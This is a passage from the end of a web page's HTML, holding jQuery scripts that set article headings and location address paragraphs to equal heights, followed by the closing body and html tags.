                    $(this).height(max);
                });

                max = 0;
                $('.article h1').each(function() {
                    var $height = $(this).height();
                    if ($height > max) {
                        max = $height;
                    }
                });
                $('.article h1').each(function() {
                    $(this).height(max);
                });
            }
        });
    </script>


    <script>
        $(document).ready(function() {
            $('.location-row').each(function() {
                var max = 0;
                $(this).find('.location p.address').each(function() {
                    var $height = $(this).height();
                    if ($height > max) {
                        max = $height;
                    }
                });
                $(this).find('.location p.address').each(function() {
                    $(this).height(max);
                });
            });
        });
    </script>


        
        
    </body>
</html>